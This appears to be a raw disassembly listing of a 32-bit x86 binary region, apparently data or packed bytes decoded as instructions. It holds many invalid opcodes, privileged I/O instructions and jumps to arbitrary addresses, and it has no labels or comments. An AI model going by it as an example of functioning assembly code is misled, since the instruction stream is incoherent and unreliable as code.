  4020a8:	pop    edi
  4020a9:	lock fidiv DWORD PTR [ebp+0x51b54708]
  4020b0:	push   edi
  4020b1:	stos   BYTE PTR es:[edi],al
  4020b2:	adc    DWORD PTR [ecx-0x7a1566e6],ecx
  4020b8:	mov    eax,ds:0xe02d17d1
  4020bd:	dec    eax
  4020be:	xchg   edi,eax
  4020bf:	fs cmp eax,0x6ec89b6a
  4020c5:	xor    DWORD PTR [eax+edi*4-0x1204792],eax
  4020cc:	sub    al,0xd4
  4020ce:	xor    al,0x1d
  4020d0:	loop   0x40206b
  4020d2:	or     al,0xff
  4020d4:	cmp    bh,BYTE PTR [ecx+0x2d]
  4020d7:	call   0x5d20e9c7
  4020dc:	lea    esi,[ebx+ebp*1+0x45]
  4020e0:	push   esp
  4020e1:	push   eax
  4020e2:	scas   eax,DWORD PTR es:[edi]
  4020e3:	xchg   edi,eax
  4020e4:	ror    DWORD PTR [eax+0x4caeee5c],0xfe
  4020eb:	pusha  
  4020ec:	mov    edx,0xc921ee69
  4020f1:	test   BYTE PTR [ebp-0x4d7ce38b],ch
  4020f7:	xchg   ecx,eax
  4020f8:	test   BYTE PTR [ebp-0x1f],bl
  4020fb:	and    esp,edx
  4020fd:	xor    al,0x93
  4020ff:	ja     0x4020cf
  402101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402103:	inc    ebp
  402104:	out    dx,eax
  402105:	mov    WORD PTR cs:[eax+0x13fd1fe4],fs
  40210c:	pop    es
  40210d:	jb     0x402098
  40210f:	int    0x67
  402111:	and    bh,cl
  402113:	jg     0x402156
  402115:	xchg   ebp,eax
  402116:	(bad)  
  402117:	xchg   DWORD PTR [esi+0x25dcb0ab],ecx
  40211d:	loop   0x4020cb
  40211f:	std    
  402120:	mov    edi,0xd0848e1c
  402125:	or     ah,0x99
  402128:	imul   ecx,DWORD PTR [ebx-0x2171b933],0x4d
  40212f:	mov    bl,0x87
  402131:	cmp    BYTE PTR [ebx],bh
  402133:	clflush BYTE PTR [ebx]
  402136:	cwde   
  402137:	dec    esp
  402138:	push   ebx
  402139:	xchg   DWORD PTR [ebx+0xf],ebp
  40213c:	in     al,0x8e
  40213e:	push   ebx
  40213f:	push   esi
  402140:	mov    ebp,0x286c8cf7
  402145:	test   eax,edi
  402147:	and    eax,0xb4e3d633
  40214c:	retf   
  40214d:	pop    edx
  40214e:	dec    esi
  40214f:	mov    ebx,0x4e1d2a02
  402154:	mov    ch,0xf
  402156:	push   ebx
  402157:	and    DWORD PTR [ebp-0x11],edx
  40215a:	jno    0x40216c
  40215c:	shr    BYTE PTR [eax-0x15f5d0d3],1
  402162:	mov    ebp,0x3214f5a8
  402168:	push   0x2d18e467
  40216d:	mov    eax,cs:0x78ce8aa9
  402173:	aas    
  402174:	jle    0x40211d
  402176:	mov    esi,?
  402178:	(bad)  
  402179:	pop    ss
  40217a:	mov    eax,ds:0xb2b45729
  40217f:	sti    
  402180:	mov    dh,0x9e
  402182:	dec    edi
  402183:	mov    ebx,0xaac7b947
  402188:	mov    ebx,0x114939dc
  40218d:	test   BYTE PTR [ecx-0x79],al
  402190:	fldenv [ebx]
  402192:	mov    cl,0x44
  402194:	inc    edi
  402195:	sar    esi,0x8d
  402198:	push   edi
  402199:	dec    edx
  40219a:	and    esp,DWORD PTR [ecx+0x32ee90c0]
  4021a0:	jne    0x4021e9
  4021a2:	sbb    DWORD PTR [edi+ebp*8],0xa3bdc23c
  4021a9:	loop   0x4021ad
  4021ab:	mov    al,0x66
  4021ad:	(bad)  ds:0xa396ec88
  4021b3:	mov    esp,DWORD PTR [ebx]
  4021b5:	int    0xca
  4021b7:	pop    ebx
  4021b8:	lods   al,BYTE PTR ds:[esi]
  4021b9:	mov    esp,0x87be6ac5
  4021be:	pop    ecx
  4021bf:	xor    al,0xf1
  4021c1:	repz dec ebp
  4021c3:	adc    BYTE PTR [esi-0x1662db8b],cl
  4021c9:	fld    QWORD PTR [eax+0x5f]
  4021cc:	xor    dh,BYTE PTR [edx+0x70]
  4021cf:	or     DWORD PTR [edi],eax
  4021d1:	into   
  4021d2:	cmp    eax,0x294867e5
  4021d7:	push   esp
  4021d8:	jl     0x402215
  4021da:	pop    eax
  4021db:	fld    TBYTE PTR [edi]
  4021dd:	jbe    0x402256
  4021df:	sub    al,BYTE PTR [edx+0x79]
  4021e2:	fs in  al,0x4e
  4021e5:	test   al,0x1b
  4021e8:	pop    ebp
  4021e9:	cmp    esp,DWORD PTR [ecx]
  4021eb:	jb     0x4021f1
  4021ed:	bound  ebx,QWORD PTR ds:0xafb1a435
  4021f3:	cmp    al,0xd
  4021f5:	push   0xfffffffe
  4021f7:	(bad)  
  4021f8:	or     ecx,DWORD PTR [edi]
  4021fa:	mov    dl,dl
  4021fc:	and    eax,0x8deec319
  402201:	ret    
  402202:	sar    BYTE PTR [ebp-0x6665d50c],1
  402208:	sahf   
  402209:	mov    eax,0xaa91a909
  40220e:	cmp    esp,DWORD PTR [esi-0x56]
  402211:	retf   
  402212:	mov    ds:0xbd69efe,eax
  402217:	shr    DWORD PTR [ecx],cl
  402219:	push   cs
  40221a:	adc    cl,BYTE PTR [edx+eiz*1+0x63]
  40221e:	jae    0x402217
  402220:	mov    cl,0xeb
  402222:	add    ebx,esi
  402224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402225:	shr    DWORD PTR [ebx],cl
  402227:	push   0x4d12c27e
  40222c:	mov    ebx,DWORD PTR [ebx-0x15814bfe]
  402232:	sbb    eax,0xe47bf6cb
  402237:	enter  0x492b,0x6a
  40223b:	rol    DWORD PTR [edx],0x14
  40223e:	cmp    BYTE PTR [esi],bl
  402240:	neg    DWORD PTR [ecx-0x15ebc9ab]
  402246:	imul   esp,DWORD PTR [ecx],0xffffffb9
  402249:	es hlt 
  40224b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40224c:	fld    TBYTE PTR [esi-0x5cc094c3]
  402252:	mov    esi,0x2f06aa96
  402257:	pop    ss
  402258:	fsub   QWORD PTR [ecx+0x4af2f76c]
  40225e:	inc    edi
  40225f:	lock gs fmul st(2),st
  402263:	inc    esi
  402264:	ins    BYTE PTR es:[edi],dx
  402265:	xchg   esp,eax
  402266:	xchg   edx,eax
  402267:	adc    BYTE PTR [ebp-0x2078e44c],0xfb
  40226e:	inc    ecx
  40226f:	add    edx,DWORD PTR [ebx-0x7a]
  402272:	das    
  402273:	popf   
  402274:	fs jmp 0x4022cf
  402277:	call   edi
  402279:	rcl    BYTE PTR [ebp+0x57],cl
  40227c:	mov    ecx,0xac1f09c0
  402281:	sbb    ch,BYTE PTR [edx+0x35967907]
  402287:	aas    
  402288:	cld    
  402289:	jmp    0x2054244f
  40228e:	adc    eax,0xdf03a3b8
  402293:	sti    
  402294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402295:	and    DWORD PTR [ebx],esp
  402297:	sar    DWORD PTR [ebp-0x220f3654],1
  40229d:	les    edx,FWORD PTR [edi+0x50]
  4022a0:	mov    edx,0x48526ccc
  4022a5:	cmp    al,0xf
  4022a7:	pop    ds
  4022a8:	icebp  
  4022a9:	ins    DWORD PTR es:[edi],dx
  4022aa:	in     eax,dx
  4022ab:	std    
  4022ac:	sahf   
  4022ad:	ret    0x5ebb
  4022b0:	mov    dl,0x4b
  4022b2:	lds    ebp,FWORD PTR [edx+esi*2+0x28]
  4022b6:	ds loop 0x402297
  4022b9:	sbb    DWORD PTR [esi-0x3c442ebf],eax
  4022bf:	or     esp,DWORD PTR [edi]
  4022c1:	test   al,0xd9
  4022c3:	push   ds
  4022c4:	jae    0x4022a2
  4022c6:	pop    ecx
  4022c7:	add    al,dh
  4022c9:	xchg   esi,eax
  4022ca:	mov    dl,0x5
  4022cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022cd:	mov    ah,0xfc
  4022cf:	xor    eax,0x45af16ef
  4022d4:	cmp    DWORD PTR [ecx+0x4a],edx
  4022d7:	or     dl,BYTE PTR [edx+0x3072fe7a]
  4022dd:	loopne 0x40226e
  4022df:	pop    edi
  4022e0:	xlat   BYTE PTR ds:[ebx]
  4022e1:	sbb    eax,0xf8760439
  4022e6:	adc    BYTE PTR [eax],bl
  4022e8:	je     0x40227f
  4022ea:	pop    edi
  4022eb:	xor    eax,0xa23659a
  4022f0:	pop    edi
  4022f1:	int    0x9c
  4022f3:	fwait
  4022f4:	sbb    esp,esp
  4022f6:	jbe    0x40234d
  4022f8:	pushf  
  4022f9:	inc    bx
  4022fb:	mov    WORD PTR [ecx+0x8],ss
  4022fe:	xor    esp,DWORD PTR [esi-0x4994fc21]
  402304:	xchg   esi,eax
  402305:	xchg   ecx,eax
  402306:	aad    0x58
  402308:	mov    ch,0x98
  40230a:	jno    0x402312
  40230c:	ja     0x402370
  40230e:	mov    DWORD PTR [eax+0x167c806],ebx
  402314:	sub    eax,0x654d9c12
  402319:	inc    ebp
  40231a:	(bad)
  40231e:	sbb    eax,0x2d715df1
  402323:	lods   al,BYTE PTR ds:[esi]
  402324:	push   esi
  402325:	lahf   
  402326:	jbe    0x4022f5
  402328:	and    esi,ebx
  40232a:	popf   
  40232b:	imul   esp,DWORD PTR [edi-0x79],0x2d
  40232f:	int3   
  402330:	xor    al,0xfe
  402332:	inc    ebp
  402333:	(bad)  [edx-0x55]
  402336:	push   edi
  402337:	lock or edi,esi
  40233a:	cs jg  0x402301
  40233d:	push   eax
  40233e:	lock mov ecx,0xa38ad622
  402344:	or     al,0x82
  402346:	mov    cl,0x3d
  402348:	sbb    ah,dh
  40234a:	adc    al,BYTE PTR [edi-0x35]
  40234d:	cs cld 
  40234f:	mov    eax,0xc4449e1a
  402354:	add    ebp,DWORD PTR [edx+0x18c2da16]
  40235a:	jecxz  0x40231e
  40235c:	push   cs
  40235d:	int3   
  40235e:	pop    esp
  40235f:	scas   al,BYTE PTR es:[edi]
  402360:	or     BYTE PTR [eax],0xe9
  402363:	adc    eax,DWORD PTR [ebx]
  402365:	loope  0x4023b3
  402367:	out    0xde,al
  402369:	shl    DWORD PTR [ebp+0x4b],0x7f
  40236d:	add    bh,bh
  40236f:	int3   
  402370:	call   0x5d9bad98
  402375:	into   
  402376:	mov    esp,0x6664685
  40237b:	mov    dl,0xbd
  40237d:	ss mov esp,0xa22aa323
  402383:	and    al,0x7d
  402385:	xchg   ebx,eax
  402386:	and    al,0x92
  402388:	ds out 0x9a,eax
  40238b:	test   al,0x73
  40238d:	lock mov edx,0x5033f9ea
  402393:	cwde   
  402394:	xchg   esi,eax
  402395:	arpl   WORD PTR [esi+0x2e6ddd5f],dx
  40239b:	js     0x40234e
  40239d:	loopne 0x402338
  40239f:	ret    
  4023a0:	jnp    0x402359
  4023a2:	mov    ecx,0xe908669b
  4023a7:	ds dec ecx
  4023a9:	enter  0x5078,0x3d
  4023ad:	adc    al,bh
  4023af:	aad    0x75
  4023b1:	jmp    0x40236a
  4023b3:	jecxz  0x40237c
  4023b5:	in     al,0xdb
  4023b7:	xor    edx,DWORD PTR [edx]
  4023b9:	sahf   
  4023ba:	pop    ds
  4023bb:	aas    
  4023bc:	push   ecx
  4023bd:	mov    bl,0x15
  4023bf:	loopne 0x402406
  4023c1:	jb     0x40243f
  4023c3:	pop    esi
  4023c4:	int    0x55
  4023c6:	stos   BYTE PTR es:[edi],al
  4023c7:	bound  ebx,QWORD PTR [esi-0x1d8fb81e]
  4023cd:	xchg   edi,eax
  4023ce:	adc    eax,0xf8d30767
  4023d3:	push   esp
  4023d4:	cdq    
  4023d5:	fsub   QWORD PTR [eax-0x44bb404a]
  4023db:	cmp    al,0xd5
  4023dd:	pop    ebx
  4023de:	rcr    cl,cl
  4023e0:	aas    
  4023e1:	and    edi,edi
  4023e3:	adc    DWORD PTR [ebp+0x10],0xc67e3ff8
  4023ea:	rcl    BYTE PTR [eax-0x4c7a48bc],1
  4023f0:	(bad)  
  4023f1:	mov    edi,0x42232699
  4023f6:	aam    0xe6
  4023f8:	push   edi
  4023f9:	jmp    0x9c43c4bd
  4023fe:	jle    0x4023a7
  402400:	fcom   DWORD PTR [eax]
  402402:	mov    gs,ebp
  402404:	test   al,0xc1
  402406:	cmp    al,0xc4
  402408:	fbstp  TBYTE PTR [ebp+0x40]
  40240b:	in     al,0xe
  40240d:	jmp    0x4023b4
  40240f:	loopne 0x4023c2
  402411:	xchg   esp,ebx
  402413:	inc    edx
  402414:	push   ss
  402415:	cmp    al,BYTE PTR [ecx-0x5e]
  402418:	stos   DWORD PTR es:[edi],eax
  402419:	test   eax,0x92254a0
  40241e:	adc    ch,BYTE PTR [esi+0x377aa8a1]
  402424:	or     ch,bh
  402426:	shl    BYTE PTR [eax+edx*2-0x67],cl
  40242a:	outs   dx,DWORD PTR ds:[esi]
  40242b:	ins    DWORD PTR es:[edi],dx
  40242c:	adc    edi,edx
  40242e:	xchg   ebx,eax
  40242f:	adc    dh,BYTE PTR [esi-0x4f9ae8d5]
  402435:	adc    edi,esi
  402437:	inc    edx
  402438:	pop    edx
  402439:	in     al,dx
  40243a:	pop    esp
  40243b:	aas    
  40243c:	adc    ecx,DWORD PTR [ebp-0x4e]
  40243f:	(bad)  
  402440:	fiadd  WORD PTR [edi-0x6c]
  402443:	mov    ebx,DWORD PTR [ebp-0x66df3078]
  402449:	xchg   ebp,eax
  40244a:	xor    al,0x1d
  40244c:	test   eax,0x46b54291
  402451:	inc    eax
  402452:	mov    al,ds:0xaead61f2
  402457:	jge    0x4024bd
  402459:	scas   eax,DWORD PTR es:[edi]
  40245a:	ja     0x40248d
  40245c:	inc    esi
  40245d:	in     eax,0xfa
  40245f:	jecxz  0x4024c4
  402461:	xlat   BYTE PTR ds:[ebx]
  402462:	cmp    dh,dh
  402464:	ins    DWORD PTR es:[edi],dx
  402465:	cmp    bl,BYTE PTR [ebx+0x10a0d61e]
  40246b:	mov    ?,WORD PTR [edi]
  40246d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40246e:	add    cl,0x40
  402471:	and    al,0x8b
  402473:	xor    al,0x80
  402475:	xor    al,0xe6
  402477:	xor    eax,0xb35f7a1
  40247c:	test   bh,bh
  40247e:	pop    ss
  40247f:	repz add DWORD PTR gs:[ecx],0x69
  402484:	jno    0x4024e5
  402486:	jo     0x402414
  402488:	cmp    eax,0x8a4075e9
  40248d:	cmp    ebp,DWORD PTR [ebp+0x79]
  402490:	mov    cl,0xb5
  402492:	cli    
  402493:	jmp    0x6890:0x3c50bd09
  40249a:	call   0xc94e:0x48d27d35
  4024a1:	push   cs
  4024a2:	or     BYTE PTR [ebx-0x55f0e4ee],al
  4024a8:	dec    eax
  4024a9:	es int 0xc
  4024ac:	mov    dl,0xa9
  4024ae:	sar    ebp,0x54
  4024b1:	hlt    
  4024b2:	and    BYTE PTR [esi-0x63fa0ca5],dl
  4024b8:	aam    0x1c
  4024ba:	inc    eax
  4024bb:	mov    BYTE PTR [edx-0x7],ah
  4024be:	mov    al,0x9d
  4024c0:	pop    ecx
  4024c1:	push   ecx
  4024c2:	and    DWORD PTR [edx+0x2eb1230d],esi
  4024c8:	pop    edx
  4024c9:	cmp    dl,0x22
  4024cc:	test   eax,0x6fdffe13
  4024d1:	cwde   
  4024d2:	mov    WORD PTR [ebx-0x3230f7fa],es
  4024d8:	dec    ebp
  4024d9:	ret    0xa3e9
  4024dc:	ins    BYTE PTR es:[edi],dx
  4024dd:	inc    eax
  4024de:	mov    dh,dh
  4024e0:	popa   
  4024e1:	out    dx,al
  4024e2:	shl    BYTE PTR [ecx+ebx*4],cl
  4024e5:	out    0xf,eax
  4024e7:	jl     0x402495
  4024e9:	pop    eax
  4024ea:	push   eax
  4024eb:	cmc    
  4024ec:	mov    eax,0x60e317d2
  4024f1:	mov    cl,0xe5
  4024f3:	dec    esi
  4024f4:	cmp    eax,DWORD PTR [edx+0x4b]
  4024f7:	lods   eax,DWORD PTR ds:[esi]
  4024f8:	or     dh,ch
  4024fa:	mov    eax,0xbab38f27
  4024ff:	sbb    ch,BYTE PTR [ebx-0x579dc5f3]
  402505:	inc    eax
  402506:	or     eax,0x55a9590
  40250b:	fcom   DWORD PTR [edi+eiz*8+0x6b34b960]
  402512:	fst    QWORD PTR [esi+0x1e]
  402515:	ret    
  402516:	stos   DWORD PTR es:[edi],eax
  402517:	dec    ebx
  402518:	cmc    
  402519:	sub    DWORD PTR [edi+0x20e343a4],0xffffffd5
  402520:	xchg   ebx,eax
  402521:	mov    bl,BYTE PTR [edx+ebx*2]
  402524:	adc    al,0x4a
  402526:	jae    0x4024bb
  402528:	outs   dx,BYTE PTR ds:[esi]
  402529:	push   eax
  40252a:	adc    DWORD PTR [edi],ecx
  40252c:	not    DWORD PTR ds:0x2bfff13c
  402532:	jge    0x40258d
  402534:	dec    ebp
  402535:	sahf   
  402536:	js     0x4024dd
  402538:	inc    ebp
  402539:	out    0x5b,eax
  40253b:	mov    ecx,0x850d33f4
  402540:	cmp    al,0x7b
  402542:	test   ecx,ecx
  402544:	pushw  0xfffc
  402547:	aam    0xd9
  402549:	xchg   ebp,eax
  40254a:	pop    eax
  40254b:	in     eax,0x79
  40254d:	sub    DWORD PTR [ecx-0x69],0xffffffb7
  402551:	mov    WORD PTR [ebp*8+0x271dec47],?
  402558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402559:	or     dl,ch
  40255b:	jne    0x40255b
  40255d:	push   es
  40255e:	test   bl,0x16
  402561:	xor    ebp,DWORD PTR [eax-0x31666d26]
  402567:	cld    
  402568:	mov    al,0x48
  40256a:	push   cs
  40256b:	push   eax
  40256c:	fimul  WORD PTR [edx-0x180a816]
  402572:	push   ebp
  402573:	into   
  402574:	jp     0x402543
  402576:	or     eax,0x8f08ec9b
  40257b:	bound  ebp,QWORD PTR [ebx]
  40257d:	mov    BYTE PTR [edi],ah
  40257f:	pop    eax
  402580:	stos   BYTE PTR es:[edi],al
  402581:	pop    ebp
  402582:	aaa    
  402583:	sbb    BYTE PTR [esi+0x1a171047],dl
  402589:	push   0x6a759ee
  40258e:	(bad)  
  40258f:	push   edx
  402590:	sbb    edi,ebp
  402592:	mov    ah,0x21
  402594:	cmc    
  402595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402596:	jecxz  0x4025f4
  402598:	xor    eax,0x2fde7c2b
  40259d:	stos   DWORD PTR es:[edi],eax
  40259e:	out    0x41,al
  4025a0:	sub    eax,0xb1c390ce
  4025a5:	sbb    al,0xdc
  4025a7:	fidivr WORD PTR [ebx+ebx*2]
  4025aa:	push   esi
  4025ab:	sbb    ecx,DWORD PTR [ecx-0x4ca44656]
  4025b1:	ins    BYTE PTR es:[edi],dx
  4025b2:	and    al,0xe6
  4025b4:	pop    ds
  4025b5:	inc    edx
  4025b7:	dec    ebp
  4025b8:	popa   
  4025b9:	loope  0x402596
  4025bb:	xor    DWORD PTR [edi],ebp
  4025bd:	jae    0x402540
  4025bf:	push   cs
  4025c0:	in     al,0x28
  4025c2:	and    ecx,DWORD PTR [ebx+0x55]
  4025c5:	xchg   ecx,eax
  4025c6:	lods   eax,DWORD PTR ds:[esi]
  4025c7:	mov    edx,0xe7365109
  4025cc:	xchg   esp,eax
  4025cd:	add    al,0xe
  4025cf:	fist   DWORD PTR [si+0x6537]
  4025d4:	cmp    DWORD PTR [eiz*4-0x148aef92],eax
  4025db:	jae    0x40265a
  4025dd:	ret    0x54eb
  4025e0:	jg     0x4025ae
  4025e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025e3:	out    dx,eax
  4025e4:	adc    ebp,ecx
  4025e6:	inc    edx
  4025e7:	inc    edx
  4025e8:	outs   dx,BYTE PTR ds:[esi]
  4025e9:	(bad)  
  4025ea:	xor    al,0x19
  4025ec:	es dec edx
  4025ee:	or     cl,dh
  4025f0:	push   0xffffff94
  4025f2:	ds push ss
  4025f4:	push   ds
  4025f5:	jecxz  0x40263f
  4025f7:	mov    esp,0xe40085ea
  4025fc:	inc    ecx
  4025fd:	xchg   ecx,eax
  4025fe:	inc    esp
  4025ff:	dec    edx
  402600:	or     eax,0xe62269d0
  402605:	cs aas 
  402607:	mov    dl,0xb5
  402609:	mov    bl,0x23
  40260b:	cmc    
  40260c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40260d:	jge    0xfee673f6
  402613:	or     ah,ch
  402615:	pop    edx
  402616:	fbld   TBYTE PTR [edi+esi*2-0x6]
  40261a:	call   0x53c4:0x60921127
  402621:	xlat   BYTE PTR ds:[ebx]
  402622:	repnz imul esi,edx,0xffffffc2
  402626:	xchg   ebx,eax
  402627:	iret   
  402628:	fadd   QWORD PTR [eax+0x54]
  40262b:	or     DWORD PTR [ecx],edi
  40262d:	xchg   ebp,eax
  40262e:	gs loope 0x4025eb
  402631:	in     al,0x22
  402633:	pop    edi
  402634:	mov    ah,0x3
  402636:	xchg   esp,eax
  402637:	inc    edi
  402638:	jbe    0x402650
  40263a:	aad    0x8e
  40263c:	mov    bl,0x3
  40263e:	pop    ds
  40263f:	cli    
  402640:	pop    ds
  402641:	or     edx,ebx
  402643:	clc    
  402644:	push   ecx
  402645:	loope  0x40268b
  402647:	pop    ss
  402648:	(bad)  
  402649:	(bad)  
  40264a:	xlat   BYTE PTR ds:[ebx]
  40264c:	push   ebx
  40264d:	hlt    
  40264e:	pop    ecx
  40264f:	xlat   BYTE PTR ds:[ebx]
  402650:	cdq    
  402651:	pushf  
  402652:	test   BYTE PTR [edx-0x54],ah
  402655:	pop    ebp
  402656:	cmp    eax,0x846b4d49
  40265b:	and    DWORD PTR [ebx-0x37],ebx
  40265e:	push   ebx
  40265f:	(bad)  
  402660:	sub    DWORD PTR [edi],ebx
  402662:	mov    eax,0xe44183e8
  402667:	(bad)  
  402668:	jo     0x4026a8
  40266a:	lock push eax
  40266c:	(bad)  
  40266d:	mov    fs,WORD PTR es:[eax-0x3b]
  402671:	stos   DWORD PTR es:[edi],eax
  402672:	sbb    BYTE PTR [eax-0x6b03ceb4],al
  402678:	leave  
  402679:	mov    ch,BYTE PTR [edi-0x3]
  40267c:	cs pop ss
  40267e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40267f:	inc    ebx
  402680:	jb     0x4026f8
  402682:	cmc    
  402683:	or     ecx,DWORD PTR [ebx-0x3d66196d]
  402689:	jbe    0x402692
  40268b:	or     BYTE PTR [esi+esi*2+0x7adb624d],bh
  402692:	pop    esp
  402693:	stc    
  402694:	cli    
  402695:	ret    
  402696:	sahf   
  402697:	and    DWORD PTR [esi-0x76ab71c8],ecx
  40269d:	xor    ebp,DWORD PTR [esi+ebp*1-0x28d52cb4]
  4026a4:	mov    eax,0x5b3518c7
  4026a9:	jae    0x40263b
  4026ab:	add    DWORD PTR [edx+0x2c],edi
  4026ae:	ja     0x402686
  4026b0:	sbb    BYTE PTR [edi-0x6d],0xe4
  4026b4:	dec    ebp
  4026b5:	cdq    
  4026b6:	or     eax,0x61c2c768
  4026bb:	rol    BYTE PTR [ecx-0x17],1
  4026be:	mov    BYTE PTR [ebp+0x7439d931],al
  4026c4:	push   esp
  4026c5:	sub    eax,0xe50a3b11
  4026ca:	adc    eax,DWORD PTR [eax-0x31ada104]
  4026d0:	xchg   esp,edi
  4026d2:	mov    cl,0xde
  4026d4:	sub    eax,0xb2eeaf04
  4026d9:	pop    ds
  4026da:	jle    0x402739
  4026dc:	clc    
  4026dd:	sub    ch,BYTE PTR [ecx-0x1df2c19c]
  4026e3:	hlt    
  4026e4:	dec    edx
  4026e5:	pop    edx
  4026e6:	ins    DWORD PTR es:[edi],dx
  4026e7:	add    ebp,edx
  4026e9:	or     eax,0xc71bc977
  4026ee:	ror    DWORD PTR [esi+ebx*1+0x2b],cl
  4026f2:	push   edi
  4026f3:	xor    BYTE PTR [ebx+edi*4+0x556d396c],dl
  4026fa:	inc    edi
  4026fb:	in     al,dx
  4026fc:	mov    ecx,0x3a7d6027
  402701:	ror    DWORD PTR [edi-0x46],1
  402704:	jae    0x40269b
  402706:	sbb    eax,0x5d87c794
  40270b:	jecxz  0x4026a7
  40270d:	sbb    dl,BYTE PTR [edx+0xc]
  402710:	push   ebx
  402711:	dec    ecx
  402712:	hlt    
  402713:	mov    dh,al
  402715:	push   esp
  402716:	or     eax,0xa817368d
  40271b:	pop    esp
  40271c:	scas   al,BYTE PTR es:[edi]
  40271d:	xor    ch,0xea
  402720:	mov    edx,DWORD PTR [eax]
  402722:	setne  BYTE PTR [eax-0x4c]
  402726:	add    DWORD PTR [ebp-0x49a7f5d3],ebp
  40272c:	cmp    BYTE PTR [ecx+0x4bac5684],dh
  402732:	lock xchg ecx,eax
  402734:	or     DWORD PTR ds:0xcfe43170,edx
  40273a:	jnp    0x402788
  40273c:	lods   al,BYTE PTR ds:[esi]
  40273d:	and    al,0x89
  40273f:	pop    edx
  402740:	mov    ds:0xf5c102fd,al
  402745:	xchg   BYTE PTR ds:[ebx+0x23],bh
  402749:	sub    eax,0xac330fa3
  40274e:	and    ah,BYTE PTR [edi+0x12fbb2bb]
  402754:	adc    eax,0x17dbbbd2
  402759:	stos   DWORD PTR es:[edi],eax
  40275a:	dec    ebx
  40275c:	scas   eax,DWORD PTR es:[edi]
  40275d:	and    edx,DWORD PTR [edi]
  40275f:	dec    esp
  402760:	std    
  402761:	inc    esp
  402762:	mov    ebp,0xf9aed1e1
  402767:	lds    ebp,FWORD PTR [ebx]
  402769:	pop    ss
  40276a:	mov    eax,ds:0x539ef046
  40276f:	scas   al,BYTE PTR es:[edi]
  402770:	sub    ebp,esp
  402772:	into   
  402773:	test   DWORD PTR [eax+edx*2+0x1855d1ef],ecx
  40277a:	scas   al,BYTE PTR es:[edi]
  40277b:	les    ebp,FWORD PTR [edi+esi*2+0x191d4761]
  402782:	and    al,0x98
  402784:	test   DWORD PTR [ebx-0x2e477c3c],edx
  40278a:	fcomi  st,st(5)
  40278c:	dec    ebp
  40278d:	or     esi,DWORD PTR [edx+eax*1-0x1776ee8f]
  402794:	(bad)  
  402795:	adc    esp,DWORD PTR [edx]
  402797:	neg    DWORD PTR [edx+0x4a2f25fc]
  40279d:	popf   
  40279e:	jl     0x40273c
  4027a0:	ficom  DWORD PTR [esi+0x49]
  4027a3:	cmc    
  4027a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027a5:	mov    ds:0xb47696f2,al
  4027aa:	scas   al,BYTE PTR es:[edi]
  4027ab:	gs aaa 
  4027ad:	lds    ebp,FWORD PTR [ecx]
  4027af:	leave  
  4027b0:	push   es
  4027b1:	and    DWORD PTR [ebp+esi*8-0x7b],0x50
  4027b6:	into   
  4027b7:	into   
  4027b8:	mov    dl,0x71
  4027ba:	out    0x9a,al
  4027bc:	fiadd  DWORD PTR [edi]
  4027be:	hlt    
  4027bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027c0:	push   ebx
  4027c1:	test   eax,0x28958184
  4027c6:	adc    bh,BYTE PTR [ebp-0x17a41926]
  4027cc:	jb     0x4027dc
  4027ce:	hlt    
  4027cf:	pusha  
  4027d0:	cmp    BYTE PTR [ebx+edx*2],ah
  4027d3:	push   edi
  4027d4:	mov    ch,BYTE PTR [ebp+0x76574686]
  4027da:	mov    cl,0xcf
  4027dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027dd:	xchg   ebx,eax
  4027de:	xchg   edx,eax
  4027df:	repnz ficom WORD PTR [ebp-0x7e]
  4027e3:	cmp    DWORD PTR [ebx-0x34],0x7d23cfcd
  4027ea:	xchg   ecx,eax
  4027eb:	fist   WORD PTR [ecx]
  4027ed:	pop    ecx
  4027ee:	adc    DWORD PTR [esi-0x228e6bd7],ebx
  4027f4:	icebp  
  4027f5:	fmul   DWORD PTR [esi+ebx*4-0x397b75e1]
  4027fc:	mov    ebp,0x1d1413af
  402801:	cmp    ah,dh
  402803:	mov    edx,0xdf2aeb29
  402808:	sub    al,0x30
  40280a:	dec    ecx
  40280b:	mov    cl,0x55
  40280d:	push   0xffffff83
  40280f:	xlat   BYTE PTR ds:[ebx]
  402810:	test   al,0x2f
  402812:	push   ebp
  402813:	xchg   esi,eax
  402814:	test   eax,0xf3610a3
  402819:	xchg   DWORD PTR [esi],eax
  40281b:	lock scas eax,DWORD PTR es:[edi]
  40281d:	xor    edx,DWORD PTR [esi-0x1b]
  402820:	(bad)  
  402822:	inc    ecx
  402823:	adc    DWORD PTR ss:[ebx-0x57],ebx
  402827:	loopne 0x4027b3
  402829:	enter  0x91bc,0xef
  40282d:	cmp    eax,DWORD PTR [ecx-0x49e764a8]
  402833:	push   ebx
  402834:	repz popf 
  402836:	arpl   WORD PTR [eax],dx
  402838:	dec    ebx
  402839:	ret    0xdb60
  40283c:	add    al,0x8d
  40283e:	lods   eax,DWORD PTR ds:[esi]
  40283f:	fist   WORD PTR [ecx]
  402841:	in     eax,0x7e
  402843:	sub    esi,DWORD PTR [esi-0xa43c58d]
  402849:	ret    
  40284a:	iret   
  40284b:	sub    ebp,esi
  40284d:	adc    dl,bl
  40284f:	push   ebx
  402850:	fmul   st(7),st
  402852:	mov    esi,0xfd144a54
  402857:	push   0x6d
  402859:	sub    DWORD PTR [edx],esi
  40285b:	ficom  DWORD PTR [esi+0x241021cf]
  402861:	cmp    al,BYTE PTR [ebx+0x1aecbfa9]
  402867:	xchg   ebp,eax
  402868:	xor    eax,0xd28ebccd
  40286d:	daa    
  40286e:	push   eax
  40286f:	mov    al,BYTE PTR [edx+0x2f]
  402872:	pop    esp
  402873:	jne    0x40284b
  402875:	inc    ebp
  402876:	int    0x77
  402878:	addr16 cwde 
  40287a:	and    eax,0x9268c3ec
